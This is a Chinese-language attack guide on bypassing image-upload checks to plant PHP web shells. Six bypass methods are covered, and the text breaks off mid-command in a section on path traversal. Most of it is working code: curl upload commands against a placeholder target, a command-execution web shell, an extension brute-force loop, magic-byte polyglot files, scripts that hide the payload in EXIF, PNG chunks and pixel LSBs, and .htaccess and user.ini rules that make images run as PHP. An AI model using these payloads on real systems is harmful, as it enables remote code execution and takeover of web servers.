## 图片上传点绕过构造方式

> 选型：纯手工构造 + 可复现的 curl 命令，覆盖 6 类绕过面（MIME 头、扩展名、魔术字节、二次渲染、解析器差异、路径与内容混淆）

### 0. 前置：先摸清校验在哪一层

```bash
# 正常图片上传，记录响应与落盘路径
curl -s -X POST http://TARGET/upload.php \
  -F "file=@ok.png;type=image/png" -b "COOKIE" -i
```

判断依据（决定用哪类绕过）：

| 现象 | 校验层 | 主攻方向 |
| --- | --- | --- |
| 改 `Content-Type` 就过 | 仅 MIME 头 | 方式 1 |
| 改扩展名就过 | 仅后缀黑名单 | 方式 2 |
| 改后缀不行、改内容行 | 魔术字节 / `getimagesize` | 方式 3 |
| 传上去被压缩/转码 | 二次渲染 | 方式 4 |
| 传上去能存不能执行 | 解析器配置 | 方式 5 |

---

### 方式 1 · Content-Type 伪造（MIME 头层）

```bash
# 内容仍是脚本，只把声明改成图片
curl -s -X POST http://TARGET/upload.php \
  -F "file=@shell.php;type=image/png" -b "COOKIE" -i

# 双扩展名 + 图片 MIME
curl -s -X POST http://TARGET/upload.php \
  -F "file=@shell.php.png;type=image/jpeg" -b "COOKIE" -i
```

`PAYLOAD`（`shell.php`）：

```php
<?php echo "PWNED:"; system($_GET['c']); ?>
```

---

### 方式 2 · 扩展名绕过（后缀黑名单层）

按目标中间件选后缀，逐个试：

```bash
for ext in php3 php4 php5 phtml pht phps phar inc pHp PhP php. php::$DATA php%00.jpg; do
  cp shell.php "shell.$ext"
  echo "== $ext =="
  curl -s -X POST http://TARGET/upload.php \
    -F "file=@shell.$ext;type=image/png" -b "COOKIE" -o /dev/null -w "%{http_code}\n"
done
```

| 目标环境 | 高命中后缀 |
| --- | --- |
| Apache + mod_php | `phtml` `pht` `php3` `php5` `phar` |
| Nginx + fastcgi | `php` 后接 `%00` / `;` / 空格（旧版本） |
| IIS 6 | `asp;.jpg` `asa` `cer` `cdx` |
| Tomcat | `jsp` `jspx` `jspf` |
| 大小写混用 | `pHp` `PhP`（Linux 区分大小写，黑名单常漏） |
| 尾部点/空格 | `shell.php.` `shell.php `（Windows 自动截断） |

---

### 方式 3 · 魔术字节 + 脚本（内容校验层）

在脚本前塞图片文件头，骗过 `getimagesize()` / `finfo`：

```bash
# GIF89a 头（最常用，解析器对 GIF 宽容）
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif.php

# PNG 头
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png.php

# JPEG 头
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01<?php system($_GET["c"]); ?>' > shell.jpg.php

curl -s -X POST http://TARGET/upload.php \
  -F "file=@shell.gif.php;type=image/gif" -b "COOKIE" -i
```

验证落盘文件是否保留脚本：

```bash
curl -s http://TARGET/uploads/shell.gif.php?c=id
```

---

### 方式 4 · 二次渲染绕过（图片被重新编码）

服务端用 GD/ImageMagick 重绘时，把脚本藏进**重绘后仍保留的元数据区**：

```bash
# 4a. EXIF Comment 段（JPEG 重绘常保留）
exiftool -Comment='<?php system($_GET["c"]); ?>' ok.jpg -o shell_exif.jpg

# 4b. PNG tEXt 块
python3 - <<'EOF'
import struct, zlib
def chunk(t, d):
    return struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t+d) & 0xffffffff)
png = open('ok.png','rb').read()
# 在 IHDR 后插入 tEXt
ihdr_end = 8 + 25
payload = chunk(b'tEXt', b'Comment\x00<?php system($_GET["c"]); ?>')
open('shell_text.png','wb').write(png[:ihdr_end] + payload + png[ihdr_end:])
EOF

# 4c. 调色板 / IDAT 最低有效位（重绘后仍存活）
# 用 PIL 把 payload 写进像素 LSB，重绘后大概率保留
python3 - <<'EOF'
from PIL import Image
img = Image.open('ok.png').convert('RGB')
px = img.load()
bits = ''.join(f'{ord(c):08b}' for c in '<?php system($_GET["c"]); ?>')
i = 0
for y in range(img.height):
    for x in range(img.width):
        if i >= len(bits): break
        r,g,b = px[x,y]
        px[x,y] = (r & 0xfe | int(bits[i]), g, b); i += 1
img.save('shell_lsb.png')
EOF
```

传上去后下载回来，`strings` 看 payload 是否还在：

```bash
curl -s http://TARGET/uploads/shell_lsb.png -o back.png && strings back.png | grep -i php
```

---

### 方式 5 · 解析器差异（能存不能执行层）

**5a. `.htaccess` 改写解析规则**（Apache，先传这个再传脚本）

```apache
AddType application/x-httpd-php .jpg .png .gif
```

```bash
curl -s -X POST http://TARGET/upload.php \
  -F "file=@.htaccess;type=image/jpeg" -b "COOKIE" -i
# 再传 shell.jpg，访问 shell.jpg 即执行
```

**5b. `user.ini`**（PHP-FPM 场景）

```ini
auto_prepend_file=shell.jpg
```

**5c. 目录穿越写配置**

```bash
curl -s -X POST http://